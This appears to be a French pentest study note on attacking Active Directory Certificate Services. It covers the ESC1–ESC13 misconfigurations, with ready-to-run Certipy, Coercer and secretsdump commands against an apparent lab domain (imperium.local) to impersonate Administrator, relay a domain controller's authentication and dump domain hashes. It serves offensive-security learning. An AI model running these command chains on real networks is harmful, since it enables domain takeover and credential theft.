# 🏛️ ADCS — Active Directory Certificate Services


## 📌 C'est quoi ADCS ?

ADCS est le rôle **PKI (Public Key Infrastructure)** de Microsoft, intégré à Active Directory. Son rôle : émettre et gérer des **certificats X.509** à l'intérieur d'un domaine Windows.

Un certificat, c'est un fichier cryptographique qui prouve une identité. Dans un domaine AD, ça sert à :

- **S'authentifier** (comme un mot de passe, mais en cryptographie)
- **Chiffrer des fichiers** (EFS, BitLocker)
- **Signer du code**
- **Authentification réseau** (WiFi 802.1X, VPN, Smart Cards)

```
Schéma simplifié :

  [Utilisateur]  →  demande un certificat  →  [CA / ADCS]
       ↓                                            ↓
  reçoit un .pfx                          vérifie les droits
       ↓                                  et signe le cert
  s'authentifie avec le cert  →  [Contrôleur de Domaine]
```

---

## 🧱 Composants d'ADCS

### Certificate Authority (CA)

C'est **le cœur d'ADCS**. La CA est l'autorité qui signe les certificats. Elle répond aux demandes et dit "oui, ce certificat est valide et je le garantis".

```
[Root CA]  →  [Subordinate CA]  →  émet les certificats aux users/machines
```

- **Root CA** : l'autorité racine, la plus critique. Compromission = game over pour toute la PKI.
- **Subordinate CA** : CA intermédiaire, celle avec qui les utilisateurs interagissent au quotidien.

### Certificate Templates (Modèles)

Ce sont des **objets Active Directory** qui définissent les règles d'un certificat :

- Qui peut en demander un ?
- Pour quel usage ?
- L'utilisateur peut-il choisir lui-même le sujet du cert ?
- Faut-il une approbation manuelle ?

> **Point clé :** Les templates sont stockés dans AD, dans `CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=...` N'importe quel utilisateur du domaine peut **lire** les templates → c'est pour ça qu'on peut les énumérer sans droits spéciaux.

### Extended Key Usage (EKU)

L'EKU définit **à quoi sert le certificat**. C'est crucial pour savoir si un cert peut être utilisé pour l'authentification Kerberos.

|EKU|Usage|Dangereux si mal configuré|
|---|---|---|
|Client Authentication (1.3.6.1.5.5.7.3.2)|Auth AD|✅ OUI|
|Smart Card Logon (1.3.6.1.4.1.311.20.2.2)|Auth AD|✅ OUI|
|Any Purpose (2.5.29.37.0)|Tout|✅ OUI (très dangereux)|
|Server Authentication|TLS serveur|Non|
|Code Signing|Signer du code|Non|
|_Vide_|Tout par défaut|✅ OUI|

### Enrollment

C'est le **processus par lequel un utilisateur demande un certificat**. Il peut se faire via :

- **RPC/DCOM** (protocole principal, port 135)
- **Web Enrollment** (`http://CA/certsrv`) → source de l'ESC8
- **Certificate Enrollment Web Service (CES/CEP)**

---

## 🔐 Comment l'authentification par certificat fonctionne

Comprendre ça, c'est comprendre pourquoi les attaques ADCS sont si puissantes.

### PKINIT (Kerberos + certificat)

```
1. L'utilisateur possède un certificat avec EKU "Client Authentication"
2. Il envoie une requête AS-REQ au DC avec son certificat (au lieu d'un mot de passe)
3. Le DC vérifie :
   - Le cert est signé par une CA de confiance (dans NTAuthCertificates)
   - Le cert n'est pas révoqué
   - L'UPN ou le SAN du cert correspond à un user AD
4. Le DC répond avec un TGT Kerberos
5. L'utilisateur peut maintenant agir comme ce user dans le domaine
```

> **Conséquence :** Si tu obtiens un certificat au nom de `Administrator`, tu peux obtenir un TGT d'`Administrator`. **Sans avoir besoin de son mot de passe.** Et même si le mot de passe change, le cert reste valide jusqu'à son expiration.

### NTLM via certificat (UnPAC the Hash)

Certipy peut aussi extraire le **hash NTLM** depuis un TGT obtenu par certificat. Utile pour du Pass-the-Hash si Kerberos ne fonctionne pas.

---

## ⚠️ Les Misconfigurations — ESC1 à ESC8+

> **Origine :** Recherche "Certified Pre-Owned" de SpecterOps (2021), Will Schroeder & Lee Christoffersen.

### ESC1 — SAN Arbitraire dans un Template

**Principe :** Le template laisse l'utilisateur spécifier lui-même le Subject Alternative Name (SAN) du certificat. Le SAN, c'est l'identité que le cert représente. Si tu peux le choisir librement → tu peux te faire passer pour n'importe qui.

**Conditions nécessaires (toutes requises) :**

1. `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` activé dans le template
2. L'EKU inclut `Client Authentication` (ou Any Purpose, ou vide)
3. `Requires Manager Approval = False`
4. `Authorized Signatures Required = 0`
5. Des utilisateurs non-privilégiés ont le droit `Enroll` sur ce template
6. La CA est dans `NTAuthCertificates` (elle est trusted pour l'auth)

**Ce qui se passe dans imperium.local :**

```
Template : InterstellarTransport
- Enrollee Supplies Subject : True  ✅
- Client Authentication : True      ✅
- Manager Approval : False          ✅
- Signatures Required : 0           ✅
- Enrollment Rights : Domain Users  ✅
```

→ **N'importe quel Domain User peut se faire passer pour Administrator.**

**Commande d'exploitation :**

```bash
# Demande un cert au nom de Administrator
certipy req -u yueh.wellington@imperium.local -p 'PASSWORD' \
  -ca 'IMPERIUM-CA' \
  -template 'InterstellarTransport' \
  -upn 'administrator@imperium.local' \
  -dc-ip 10.2.62.171 -target-ip 10.2.62.169

# Utilise le cert pour s'authentifier
certipy auth -pfx administrator.pfx -dc-ip 10.x.x.x
# → retourne le hash NT de administrator + un TGT
```

---

### ESC2 — Template "Any Purpose" ou EKU vide

**Principe :** Le certificat n'a pas d'EKU restrictive (soit `Any Purpose`, soit pas d'EKU du tout). Microsoft considère qu'un cert sans EKU peut être utilisé pour **n'importe quel usage**, y compris l'authentification.

**Différence avec ESC1 :** Ici, l'enrollee ne choisit pas le SAN — le cert sera à son propre nom. Mais le cert obtenu peut être réutilisé comme Enrollment Agent (→ ESC3) ou pour d'autres abus.

**Conditions :**

- EKU = `Any Purpose` OU EKU absente
- Enrollment ouvert à des users non-privilégiés
- Manager Approval = False

---

### ESC3 — Enrollment Agent Abusé

**Principe :** Un Enrollment Agent est quelqu'un qui peut **demander des certificats au nom d'autres utilisateurs**. Si un template permet de devenir Enrollment Agent ET qu'un autre template permet à un Enrollment Agent de demander des certs d'authentification → on peut obtenir un cert pour n'importe qui.

**C'est une attaque en 2 étapes :**

```
Étape 1 : Obtenir un cert "Enrollment Agent"
  certipy req -template 'VulnerableEnrollmentAgentTemplate' ...

Étape 2 : Utiliser ce cert pour demander un cert d'auth au nom d'Administrator
  certipy req -template 'User' -on-behalf-of 'DOMAIN\Administrator' \
    -pfx enrollment_agent.pfx ...
```

**Conditions :**

- Template 1 : EKU = `Certificate Request Agent`, Enrollment ouvert
- Template 2 : autorise les Enrollment Agents, EKU = Client Auth

---

### ESC4 — Mauvaises ACLs sur un Template (Write)

**Principe :** Un utilisateur non-privilégié a des droits d'**écriture** sur un objet template AD. Il peut donc **modifier le template** pour y activer `EnrolleeSuppliesSubject`, désactiver l'approbation, etc. → le rendre vulnérable à ESC1.

**Droits dangereux sur un template :**

|Droit AD|Ce que ça permet|
|---|---|
|`GenericAll`|Contrôle total|
|`GenericWrite`|Modifier tous les attributs|
|`WriteProperty`|Modifier certains attributs|
|`WriteDacl`|Modifier les ACLs → s'octroyer GenericAll|
|`WriteOwner`|Devenir propriétaire → s'octroyer GenericAll|

**Dans imperium.local :**

```
Template : SpiceStorage
- Full Control : vladimir.harkonnen  ← ce user peut modifier le template
→ Si tu compromets vladimir.harkonnen, tu peux modifier SpiceStorage pour faire de l'ESC1
```

**Commande Certipy v5 :**

```bash
# Certipy peut automatiquement modifier le template pour le rendre ESC1-like
certipy template -u vladimir.harkonnen@imperium.local -p 'PASSWORD' \
  -template 'SpiceStorage' \
  -save-old \   
  -dc-ip 10.x.x.x

# Puis exploiter comme ESC1
certipy req -template 'SpiceStorage' -upn 'administrator@imperium.local' ...

# Restaurer après exploitation
certipy template -u vladimir.harkonnen@imperium.local -p 'PASSWORD' \
  -template 'SpiceStorage' \
  -configuration SpiceStorage.json \  # ← fichier sauvegardé par -save-old
  -dc-ip 10.x.x.x
```

---

### ESC5 — Mauvaises ACLs sur des Objets PKI AD

**Principe :** Des droits en écriture sur des objets AD liés à l'infrastructure PKI globale (pas juste un template), permettent de compromettre toute la chaîne de confiance.

**Objets critiques :**

|Objet AD|Impact si compromis|
|---|---|
|`NTAuthCertificates`|Ajouter une CA de confiance → tout cert qu'on forge sera accepté|
|`CN=Public Key Services`|Contrôle de toute la PKI|
|`CN=Enrollment Services`|Modifier les CA disponibles|
|L'objet CA lui-même|Voir ESC7|

---

### ESC6 — Flag EDITF_ATTRIBUTESUBJECTALTNAME2

**Principe :** Un flag activé **directement sur la CA** (pas sur un template) qui permet à **n'importe quelle requête de certificat** de spécifier un SAN arbitraire, même si le template ne l'autorise pas.

C'est comme ESC1 mais qui s'applique à **tous les templates** en même temps.

**Comment vérifier :**

```bash
# Certipy le détecte automatiquement dans "User Specified SAN : Enabled"
# Manuellement sur Windows :
certutil -config "caladan.imperium.local\IMPERIUM-CA" -getreg policy\EditFlags
# Chercher le bit 0x00040000
```

> Dans imperium.local, `User Specified SAN : Disabled` → pas d'ESC6 ici.

---

### ESC7 — Mauvaises ACLs sur la CA elle-même

**Principe :** Des utilisateurs non-admins ont des droits de gestion sur la CA.

|Droit|Ce que ça permet|
|---|---|
|`ManageCA`|Modifier la config de la CA, activer le flag ESC6, approuver des requêtes|
|`ManageCertificates`|Approuver des requêtes en attente (contourne Manager Approval)|

**Cas pratique avec `ManageCertificates` :**

```bash
# 1. Demander un cert sur un template qui requiert approbation
certipy req -template 'VulnerableTemplate' -upn 'administrator@domain.local' ...
# → Request ID: 42 (en attente)

# 2. S'octroyer le droit ManageCA si on n'a que ManageCertificates
certipy ca -ca 'IMPERIUM-CA' -add-officer 'monuser' ...

# 3. Approuver sa propre requête
certipy ca -ca 'IMPERIUM-CA' -issue-request 42 ...

# 4. Récupérer le cert approuvé
certipy req -ca 'IMPERIUM-CA' -retrieve 42 ...
```

---

### ESC8 — NTLM Relay vers Web Enrollment (HTTP)

**Principe :** L'interface Web Enrollment (`/certsrv`) fonctionne en HTTP sans signing ni EPA (Extended Protection for Authentication). On peut donc faire un **NTLM Relay** : forcer un compte à s'authentifier vers nous, et relayer cette authentification vers la CA pour obtenir un certificat en son nom.

Le cœur du problème :

- Une interface web appelée **Web Enrollment** permet de demander des certificats
- Elle accepte des connexions en **HTTP (non chiffré et sans protection avancée)**
- Elle utilise **NTLM authentication**
- Et surtout : elle ne vérifie pas correctement _qui est derrière la requête_

### C’est quoi un NTLM Relay ?

Normalement :
1. Un utilisateur se connecte à un service
2. Il prouve son identité via NTLM
3. Le service accepte ou refuse

Dans un **NTLM relay attack** :

- Tu ne déchiffres pas le mot de passe
- Tu ne le voles pas directement
- Tu fais juste un “proxy malveillant”

Résultat : on peut **intercepter une authentification NTLM et la “relayer” ailleurs**
**Cible idéale :** Le machine account d'un DC (`DC$`). Si on obtient son certificat → on peut faire un DCSync (dump de tous les hashes du domaine).

**Dans imperium.local :**

```
CA : IMPERIUM-CA sur caladan.imperium.local
Web Enrollment HTTP : Enabled  ✅
Web Enrollment HTTPS : Disabled ✅
→ ESC8 confirmé
```

**Exploitation en 2 terminaux :**

```bash
# Terminal 1 — Lancer le relay NTLM vers la CA
certipy relay -target http://caladan.imperium.local/certsrv/certfnsh.asp -template 'DomainController'

# Terminal 2 — Forcer le DC à s'authentifier vers toi (coercion)
# Options : coercer, printerbug, petitpotam, dfscoerce...
coercer coerce -u yueh.wellington -p 'PASSWORD' -d imperium.local --target-ip $IP --listener-ip <TON_IP>

# Résultat : certipy reçoit l'auth du DC, demande un cert à sa place
# → caladan.pfx (cert du machine account du DC)

# Utiliser le cert du DC pour DCSync
certipy auth -pfx caladan.pfx -dc-ip 10.x.x.x
secretsdump -just-dc-user Administrator imperium.local/<DC_HASH> ...
```

---

### ESC9 & ESC10 — Abus via UPN et GenericWrite

**Principe :** Ces attaques utilisent la combinaison de :

- Un droit `GenericWrite` sur un compte utilisateur
- Un template sans "security extension" (pas de SID binding)

ESC9 : le template a le flag `CT_FLAG_NO_SECURITY_EXTENSION`. On peut modifier l'UPN d'un user cible pour qu'il corresponde à un admin, demander un cert, puis remettre l'UPN d'origine.

ESC10 : abus de la configuration `StrongCertificateBindingEnforcement = 0` côté DC.

---

### ESC13 — OID Group Link

**Principe :** Certains templates sont liés à des **groupes AD via un OID** (`msPKI-Certificate-Policy`). Obtenir un certificat depuis ce template vous ajoute automatiquement dans ce groupe le temps de la session Kerberos — même si vous n'en faites pas partie dans AD.

Si le groupe lié est `Domain Admins` → privesc directe.

---

## 🗺️ Arbres de décision d'attaque

### Avec un compte Domain User

```
Es-tu Domain User ?
│
├─ Y a-t-il un template ESC1 enrollable par Domain Users ?
│   └─ OUI → certipy req → certipy auth → DA en 2 commandes
│
├─ Y a-t-il un Web Enrollment HTTP (ESC8) ?
│   └─ OUI → Relay + Coercion du DC → cert DC$ → DCSync
│
└─ Y a-t-il un template ESC2/ESC3 enrollable ?
    └─ OUI → Obtenir cert Enrollment Agent → demander cert Administrator
```

### Avec un compte plus privilégié

```
As-tu compromis un compte avec GenericWrite sur un template ?
└─ ESC4 : modifier le template → le rendre ESC1

As-tu ManageCA ou ManageCertificates sur la CA ?
└─ ESC7 : approuver tes propres requêtes, activer ESC6

As-tu des droits sur NTAuthCertificates ?
└─ ESC5 : ajouter ta propre CA → forger des certs arbitraires
```

---

## 🛠️ Outils

|Outil|Plateforme|Usage principal|
|---|---|---|
|**Certipy v5**|Linux|Enum + exploitation complète (ESC1→ESC16)|
|**Certify** (GhostPack)|Windows|Enum + exploitation|
|**BloodHound CE**|Linux/Windows|Visualisation des chemins d'attaque ADCS|
|**bloodhound-python**|Linux|Collecte de données pour BloodHound CE|
|**PKINITtools**|Linux|Abus PKINIT / UnPAC the Hash|
|**Impacket**|Linux|NTLM relay, secretsdump, pass-the-hash|
|**Coercer / printerbug**|Linux|Forcer une authentification NTLM (pour ESC8)|

---

## 📋 Checklist Pentest ADCS

### Enumération

```bash
# Scan complet Certipy v5
certipy find -u USER@DOMAIN -p PASSWORD -dc-ip IP -vulnerable -enabled

# Output lisible
cat *_Certipy.txt | grep -E "(ESC|Vulnerabilit|Template Name|Enrollment Rights)"
```

### Checklist de lecture du output

- [ ] **ESC8** : `Web Enrollment → HTTP → Enabled` ?
- [ ] **ESC6** : `User Specified SAN : Enabled` ?
- [ ] **ESC1** : Template avec `Enrollee Supplies Subject: True` + `Client Authentication: True` + `Enrollment Rights: Domain Users` + pas d'approbation ?
- [ ] **ESC4** : Un user non-admin a `Full Control / Write Owner / Write DACL` sur un template ?
- [ ] **ESC7** : Un user non-admin a `ManageCA / ManageCertificates` ?
- [ ] **ESC2** : Template avec EKU vide ou `Any Purpose` enrollable ?
- [ ] **ESC3** : Template `Enrollment Agent` enrollable + template cible vulnérable ?

---
  